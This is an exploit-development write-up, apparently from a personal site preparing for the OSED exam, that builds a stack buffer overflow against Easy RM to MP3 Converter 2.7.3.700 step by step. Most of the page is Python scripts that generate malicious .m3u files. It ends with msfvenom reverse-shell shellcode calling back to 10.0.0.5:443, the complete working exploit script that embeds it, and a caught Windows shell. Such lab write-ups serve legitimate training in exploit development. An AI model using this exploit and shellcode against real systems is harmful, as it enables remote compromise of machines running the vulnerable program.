---
layout: page
title: Vanilla Buffer Overflows
description: Vanilla Buffer Overflow write-ups.
img: 
importance: 2
category: Development
subcategory: red
related_publications: false
---

<h2>Introduction</h2>
In preparation for the OSED, you have to start somewhere.  The starting point is always vanilla buffer overflow.  This means no security features like Data Execution Prevention (DEP) or Address Space Layout Randomization (ASLR).  We will focus on just getting the Buffer Overflow to work.  This is my write-ups for at least some of the Buffer Overflows.

<br />
<h2>Links</h2>
<a href="https://www.exploit-db.com/exploits/10374">Easy RM to MP3 Converter 2.7.3.700</a><br />

<br />
<h2>Table of Contents</h2>
<ol>
    <li><a href="#mp3_id">Easy RM to MP3 Converter 2.7.3.700</a></li>
</ol>

<br />
<h2>Process</h2>

<div id="mp3_id">
    <h3>Easy RM to MP3 Converter 2.7.3.700</h3>
</div>

<br />
Loosely based on the Corelan tutorial.

<a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/</a>

<br />
Download and install a copy of the Easy RM to MP3 Converter.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/download.png" title="Download" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/48257"></a>

<br />
Create a python that will create a malicious .m3u file that uses 10000 to crash the program.

{% capture initialcreate %}
out = 'crash.m3u'

junk = '\x41' * 10000
with open(out,'w+') as fs:
    fs.write(junk)
    
print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x00.py"
   content=initialcreate %}

<br />
Run the code and produce the malicious .m3u file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/crash.png" title="Crash File" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Load WinDBG with the RM to MP3 Converter program.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/loadwindbg.png" title="Load WinDBG" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Load the malicious file that the python script just created.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/loadfile.png" title="Load File" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to create a bunch of fuzz file trying to find a break point that will overwrite the EIP.

{% capture fuzzfiles %}
for x in range(10000,50000,5000):
    out = 'crash{sz}.m3u'.format(sz=x)
    junk = '\x41' * x
    with open(out,'w+') as fs:
        fs.write(junk)

print('m3u Files Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x01.py"
   content=fuzzfiles %}

<br />
Run the code and generate all of the possible fuzzing file.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/gen_fuzzers.png" title="Generate Fuzzers" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Load all of the files into the program and notice that the 30000 breaks the program and finally overwrites the EIP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/take_eip.png" title="Overwrite EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to hardcode the break-point value.

{% capture breakpoint %}
out = 'crash30000.m3u'
junk = '\x41' * 30000

with open(out,'w+') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x02.py"
   content=breakpoint %}

<br />
Use msf-pattern_create to generate a pattern than can be used to determine the EIP offset.

{% capture patterncreate %}
┌──(kali㉿kali)-[~]
└─$ msf-pattern_create -l 30000

<snip>
{% endcapture %}

{% include terminal.html
   language="bash"
   title="bash"
   content=patterncreate %}

<br />
Update the code to include the patter that was just created by the msf.

{% capture includejunk %}
out = 'crash30000.m3u'
# junk = '\x41' * 30000

junk = <snip>

with open(out,'w+') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x03.py"
   content=includejunk %}

<br />
Run the code and check the bad pattern in the EIP register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/eip_bad_pattern.png" title="Check EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check it in the msf-pattern_offset and notice that there is no exact match.

{% capture patteroffset %}
┌──(kali㉿kali)-[~]
└─$ msf-pattern_offset -l 30000 -q 6c48346d
[*] No exact matches, looking for likely candidates...
[+] Possible match at offset 5803 (adjusted [ little-endian: 1 | big-endian: 1305601 ] ) byte offset 0
[+] Possible match at offset 5833 (adjusted [ little-endian: -16777216 | big-endian: -15471616 ] ) byte offset 3
{% endcapture %}

{% include terminal.html
   language="bash"
   title="bash"
   content=patteroffset %}

<br />
Time to do this 'binary search' style.  Update the code to split the junk string into two separate variables directly in half.  That will 15,000 for the As and 15,000 for the Bs.

{% capture binarysearchstart %}
out = 'crash30000.m3u'
junk = '\x41' * 15000
junk += '\x42' * 15000

with open(out,'w+') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x04.py"
   content=binarysearchstart %}

<br />
Check the EIP and notice the 42s in the EIP register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/first_run_eip.png" title="First Run EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to split the Bs (42s) exactly like we did before and Bs and Cs.  That will be 7500 for Bs and 7500 Cs.

{% capture binarysearchsec %}
out = 'crash30000.m3u'
junk = '\x41' * 15000
junk += '\x42' * 7500
junk += '\x43' * 7500

with open(out,'w+') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x05.py"
   content=binarysearchsec %}

<br />
Run it again and check the new value in the EIP register value.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/sec_run_eip.png" title="Second Run EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Continue to update the code continually updating the code, splitting the EIP in half, until you eventually get the exact for characters in the EIP.

{% capture binarysearchlast %}
out = 'crash30000.m3u'
junk = '\x41' * 15000
junk += '\x42' * 7500
junk += '\x43' * 1875
junk += '\x44' * 937
junk += '\x45' * 469
junk += '\x46' * 234
junk += '\x47' * 58
junk += '\x48' * 7
junk += '\x49' * 3
junk += '\x50' * 4
junk += '\x51' * 15
junk += '\x52' * 30
junk += '\x53' * 118
junk += '\x54' * 3750

with open(out,'w+') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x06.py"
   content=binarysearchlast %}

<br />
Run the code just to confirm the 50s in the EIP register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/final_run_eip.png" title="Final Run EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to condense the variable into the break, EIP, and rest of the string. Run the code again just to ensure that we still have 42s in the EIP register.

{% capture condensecode %}
out = 'crash30000.m3u'
junk = '\x41' * 26083
junk += '\x42' * 4
junk += '\x43' * (30000 - len(junk))

with open(out,'w+') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x07.py"
   content=condensecode %}

<br />
Update the code to include all of the bad chars (exluding the \x00s) to determine the bad characters for the program.

{% capture badchars %}
badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

out = 'crash30000.m3u'
junk = b'\x41' * 26083
junk += b'\x42' * 4
junk += badchars
junk += b'\x43' * (30000 - len(junk))

with open(out,'wb') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x08.py"
   content=badchars %}

<br />
Run it and check the ESP register.  Notice the first 4 bad chars drop off.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/bad_char_first_run.png" title="Bad Chars First Run" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to include a buffer so the bad chars align with the ESP register.

{% capture alignfix %}
badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

out = 'crash30000.m3u'
junk = b'\x41' * 26083
junk += b'\x42' * 4
junk += b'\x43' * 4
junk += badchars
junk += b'\x44' * (30000 - len(junk))

with open(out,'wb') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x09.py"
   content=alignfix %}

<br />
Run the code again and notice the drop-off at the 09 position.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/bad_char_sec_run.png" title="Bad Chars Second Run" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to remove the 09 from the bad chars list.

{% capture removezeronine %}
# baddies = \x00\x09

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

out = 'crash30000.m3u'
junk = b'\x41' * 26083
junk += b'\x42' * 4
junk += b'\x43' * 4
junk += badchars
junk += b'\x44' * (30000 - len(junk))

with open(out,'wb') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x0a.py"
   content=removezeronine %}

<br />
Run the code again and notice that there is still a drop-off in the 0a position.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/bad_char_third_run.png" title="Bad Chars Third Run" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to remove 0a from the bad chars list.

{% capture removezeroa %}
# baddies = \x00\x09\x0a

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

out = 'crash30000.m3u'
junk = b'\x41' * (26083)
junk += b'\x42' * 4
junk += b'\x43' * 4
junk += badchars
junk += b'\x44' * (30000 - len(junk))

with open(out,'wb') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x0b.py"
   content=removezeroa %}

<br />
Run the code again and notice that we have a clear run on the bad chars list.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/bad_char_fourth_run.png" title="Bad Chars Fourth Run" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Load the .narly module into the WinDBG memory.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/load_narly.png" title="Load Narly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run !nmod to get a list of the module.  Since there is a bad char in the address range for the binary we are going to have to use a system module.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/run_nmod.png" title="Run !nmod" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the msf-nasm_shell to find the opcodes for jmp esp.

{% capture nasmshell %}
┌──(kali㉿kali)-[~]
└─$ msf-nasm_shell                         
nasm > jmp esp
00000000  FFE4              jmp esp
nasm >
{% endcapture %}

{% include terminal.html
   language="bash"
   title="bash"
   content=nasmshell %}

<br />
Search for the system dll address range for a jmp esp command.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/search_jmp_esp.png" title="Search for jmp esp" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to include a stub for the future payload.

{% capture payload %}
# baddies = \x00\x09\x0a

payload = (
    b'\x45' * 400
)

out = 'crash30000.m3u'
junk = b'\x41' * (26083)
junk += b'\x42' * 4
junk += b'\x43' * 4
junk += payload
junk += b'\x44' * (30000 - len(junk))

with open(out,'wb') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x0c.py"
   content=payload %}

<br />
Check the ESP to ensure that the payload is there.  We should see all the 45s.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/check_esp_payload.png" title="Check ESP for Payload" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with the jmp esp address.

{% capture includeaddress %}
from struct import pack

# baddies = \x00\x09\x0a

payload = (
    b'\x45' * 400
)

out = 'crash30000.m3u'
junk = b'\x41' * (26083)
junk += pack('<L', (0x7615802b))
junk += b'\x43' * 4
junk += payload
junk += b'\x44' * (30000 - len(junk))

with open(out,'wb') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x0d.py"
   content=includeaddress %}

<br />
Insert a breakpoint in WinDBG to test the address that we just captured.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/breakpoint.png" title="Breakpoint" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Catch the breakpoint and notice the jmp command.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/vanillabof/rmmp3/catch_break.png" title="Catch Breakpoint" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use msfvenom to generate a shellcode.

{% capture generatepayload %}
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 ExitFunc=thread -f python -b '\x00\x09\x0a' -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xb8\x25\x94\x39\xbe\xda\xda\xd9\x74\x24\xf4"
payload += b"\x5a\x29\xc9\xb1\x52\x83\xc2\x04\x31\x42\x0e"
payload += b"\x03\x67\x9a\xdb\x4b\x9b\x4a\x99\xb4\x63\x8b"
payload += b"\xfe\x3d\x86\xba\x3e\x59\xc3\xed\x8e\x29\x81"
payload += b"\x01\x64\x7f\x31\x91\x08\xa8\x36\x12\xa6\x8e"
payload += b"\x79\xa3\x9b\xf3\x18\x27\xe6\x27\xfa\x16\x29"
payload += b"\x3a\xfb\x5f\x54\xb7\xa9\x08\x12\x6a\x5d\x3c"
payload += b"\x6e\xb7\xd6\x0e\x7e\xbf\x0b\xc6\x81\xee\x9a"
payload += b"\x5c\xd8\x30\x1d\xb0\x50\x79\x05\xd5\x5d\x33"
payload += b"\xbe\x2d\x29\xc2\x16\x7c\xd2\x69\x57\xb0\x21"
payload += b"\x73\x90\x77\xda\x06\xe8\x8b\x67\x11\x2f\xf1"
payload += b"\xb3\x94\xab\x51\x37\x0e\x17\x63\x94\xc9\xdc"
payload += b"\x6f\x51\x9d\xba\x73\x64\x72\xb1\x88\xed\x75"
payload += b"\x15\x19\xb5\x51\xb1\x41\x6d\xfb\xe0\x2f\xc0"
payload += b"\x04\xf2\x8f\xbd\xa0\x79\x3d\xa9\xd8\x20\x2a"
payload += b"\x1e\xd1\xda\xaa\x08\x62\xa9\x98\x97\xd8\x25"
payload += b"\x91\x50\xc7\xb2\xd6\x4a\xbf\x2c\x29\x75\xc0"
payload += b"\x65\xee\x21\x90\x1d\xc7\x49\x7b\xdd\xe8\x9f"
payload += b"\x2c\x8d\x46\x70\x8d\x7d\x27\x20\x65\x97\xa8"
payload += b"\x1f\x95\x98\x62\x08\x3c\x63\xe5\x3d\xc1\x6b"
payload += b"\xf0\x29\xc3\x6b\xfb\x12\x4a\x8d\x91\x74\x1b"
payload += b"\x06\x0e\xec\x06\xdc\xaf\xf1\x9c\x99\xf0\x7a"
payload += b"\x13\x5e\xbe\x8a\x5e\x4c\x57\x7b\x15\x2e\xfe"
payload += b"\x84\x83\x46\x9c\x17\x48\x96\xeb\x0b\xc7\xc1"
payload += b"\xbc\xfa\x1e\x87\x50\xa4\x88\xb5\xa8\x30\xf2"
payload += b"\x7d\x77\x81\xfd\x7c\xfa\xbd\xd9\x6e\xc2\x3e"
payload += b"\x66\xda\x9a\x68\x30\xb4\x5c\xc3\xf2\x6e\x37"
payload += b"\xb8\x5c\xe6\xce\xf2\x5e\x70\xcf\xde\x28\x9c"
payload += b"\x7e\xb7\x6c\xa3\x4f\x5f\x79\xdc\xad\xff\x86"
payload += b"\x37\x76\x1f\x65\x9d\x83\x88\x30\x74\x2e\xd5"
payload += b"\xc2\xa3\x6d\xe0\x40\x41\x0e\x17\x58\x20\x0b"
payload += b"\x53\xde\xd9\x61\xcc\x8b\xdd\xd6\xed\x99"
{% endcapture %}

{% include terminal.html
   language="bash"
   title="bash"
   content=generatepayload %}

<br />
Update the code with the msfvenom code.

{% capture addfullpayload %}
from struct import pack

# baddies = \x00\x09\x0a

payload =  b""
payload += b"\xb8\x25\x94\x39\xbe\xda\xda\xd9\x74\x24\xf4"
payload += b"\x5a\x29\xc9\xb1\x52\x83\xc2\x04\x31\x42\x0e"
payload += b"\x03\x67\x9a\xdb\x4b\x9b\x4a\x99\xb4\x63\x8b"
payload += b"\xfe\x3d\x86\xba\x3e\x59\xc3\xed\x8e\x29\x81"
payload += b"\x01\x64\x7f\x31\x91\x08\xa8\x36\x12\xa6\x8e"
payload += b"\x79\xa3\x9b\xf3\x18\x27\xe6\x27\xfa\x16\x29"
payload += b"\x3a\xfb\x5f\x54\xb7\xa9\x08\x12\x6a\x5d\x3c"
payload += b"\x6e\xb7\xd6\x0e\x7e\xbf\x0b\xc6\x81\xee\x9a"
payload += b"\x5c\xd8\x30\x1d\xb0\x50\x79\x05\xd5\x5d\x33"
payload += b"\xbe\x2d\x29\xc2\x16\x7c\xd2\x69\x57\xb0\x21"
payload += b"\x73\x90\x77\xda\x06\xe8\x8b\x67\x11\x2f\xf1"
payload += b"\xb3\x94\xab\x51\x37\x0e\x17\x63\x94\xc9\xdc"
payload += b"\x6f\x51\x9d\xba\x73\x64\x72\xb1\x88\xed\x75"
payload += b"\x15\x19\xb5\x51\xb1\x41\x6d\xfb\xe0\x2f\xc0"
payload += b"\x04\xf2\x8f\xbd\xa0\x79\x3d\xa9\xd8\x20\x2a"
payload += b"\x1e\xd1\xda\xaa\x08\x62\xa9\x98\x97\xd8\x25"
payload += b"\x91\x50\xc7\xb2\xd6\x4a\xbf\x2c\x29\x75\xc0"
payload += b"\x65\xee\x21\x90\x1d\xc7\x49\x7b\xdd\xe8\x9f"
payload += b"\x2c\x8d\x46\x70\x8d\x7d\x27\x20\x65\x97\xa8"
payload += b"\x1f\x95\x98\x62\x08\x3c\x63\xe5\x3d\xc1\x6b"
payload += b"\xf0\x29\xc3\x6b\xfb\x12\x4a\x8d\x91\x74\x1b"
payload += b"\x06\x0e\xec\x06\xdc\xaf\xf1\x9c\x99\xf0\x7a"
payload += b"\x13\x5e\xbe\x8a\x5e\x4c\x57\x7b\x15\x2e\xfe"
payload += b"\x84\x83\x46\x9c\x17\x48\x96\xeb\x0b\xc7\xc1"
payload += b"\xbc\xfa\x1e\x87\x50\xa4\x88\xb5\xa8\x30\xf2"
payload += b"\x7d\x77\x81\xfd\x7c\xfa\xbd\xd9\x6e\xc2\x3e"
payload += b"\x66\xda\x9a\x68\x30\xb4\x5c\xc3\xf2\x6e\x37"
payload += b"\xb8\x5c\xe6\xce\xf2\x5e\x70\xcf\xde\x28\x9c"
payload += b"\x7e\xb7\x6c\xa3\x4f\x5f\x79\xdc\xad\xff\x86"
payload += b"\x37\x76\x1f\x65\x9d\x83\x88\x30\x74\x2e\xd5"
payload += b"\xc2\xa3\x6d\xe0\x40\x41\x0e\x17\x58\x20\x0b"
payload += b"\x53\xde\xd9\x61\xcc\x8b\xdd\xd6\xed\x99"

out = 'crash30000.m3u'
junk = b'\x41' * (26083)
junk += pack('<L', (0x75e5802b))
junk += b'\x43' * 4
junk += b'\x90' * 16
junk += payload
junk += b'\x44' * (30000 - len(junk))

with open(out,'wb') as fs:
    fs.write(junk)

print('m3u File Created successfully\n')
{% endcapture %}

{% include terminal.html
   language="python"
   title="mp3_0x0e.py"
   content=addfullpayload %}

<br />
Start a netcat listener.

{% capture startlistener %}
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
{% endcapture %}

{% include terminal.html
   language="bash"
   title="bash"
   content=startlistener %}

<br />
Execute the code and catch the shell.

{% capture catchshell %}
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.6] 51440
{% endcapture %}

{% capture windowsprompt %}
Microsoft Windows [Version 10.0.19045.6093]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Easy RM to MP3 Converter>
{% endcapture %}

{% include terminal.html
   language="bash"
   title="bash"
   content=catchshell %}

{% include terminal.html
   language="cmd"
   title="cmd.exe"
   content=windowsprompt %}

<br />
And there is our trophy!